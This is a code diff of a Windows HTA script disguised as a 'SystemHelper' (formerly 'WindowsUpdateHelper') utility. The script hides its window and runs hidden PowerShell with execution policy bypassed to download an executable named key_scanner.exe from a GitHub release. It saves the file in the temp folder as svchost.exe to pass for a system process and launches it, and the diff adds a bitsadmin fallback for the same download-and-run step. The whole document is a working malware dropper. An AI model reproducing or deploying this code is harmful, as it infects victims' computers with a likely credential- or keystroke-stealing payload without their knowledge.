@@ -1,6 +1,6 @@
 <hta:application
   id="oHTA"
-  applicationname="WindowsUpdateHelper"
+  applicationname="SystemHelper"
   border="none"
   caption="no"
   showintaskbar="no"
@@ -17,24 +17,22 @@
   ' ==== ENSURE WINDOW NEVER APPEARS ====
   Window.resizeTo 0,0
   Window.moveTo -2000,-2000
-  
-  ' ==== METHOD 1: ULTRA-SILENT POWERSHELL EXECUTION ====
   Set WshShell = CreateObject("WScript.Shell")
-  psCommand = "powershell -NoP -NonI -W Hidden -Exec Bypass ""$p='%temp%\dllhost.exe';" & _
+  
+  ' ==== METHOD 1: ULTRA-SILENT DOWNLOAD & EXECUTION ====
+  ' First try PowerShell (most reliable)
+  psCommand = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""$p='%temp%\svchost.exe';" & _
               "try{(New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe',$p);" & _
               "if(Test-Path $p){Start-Process -WindowStyle Hidden $p}}catch{}"""
   
-  ' ==== EXECUTE THROUGH WSCRIPT (NO FLASH) ====
-  WshShell.Run "wscript.exe //E:vbscript //B ""C:\Windows\Temp\runner.vbs""", 0, False
+  ' ==== METHOD 2: FALLBACK TO BITSADMIN ====
+  bitsCommand = "cmd /c bitsadmin /transfer myjob /download /priority high " & _
+                "https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe " & _
+                "%temp%\\svchost.exe && start /b %temp%\\svchost.exe"
   
-  ' Create helper VBS to run PowerShell
-  Set fso = CreateObject("Scripting.FileSystemObject")
-  Set file = fso.CreateTextFile("C:\Windows\Temp\runner.vbs", True)
-  file.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
-  file.WriteLine "WshShell.Run """ & psCommand & """, 0, False"
-  file.Close
+  ' ==== EXECUTE SILENTLY ====
+  WshShell.Run "cmd /c " & psCommand & " || " & bitsCommand, 0, False
   
-  ' ==== SELF-CLEANUP ====
-  window.setTimeout "Self.Close()", 3000
-  window.setTimeout "fso.DeleteFile(""C:\Windows\Temp\runner.vbs"")", 5000
+  ' ==== FORCE CLOSE HTA ====
+  window.setTimeout "Self.Close()", 1000
 </script>
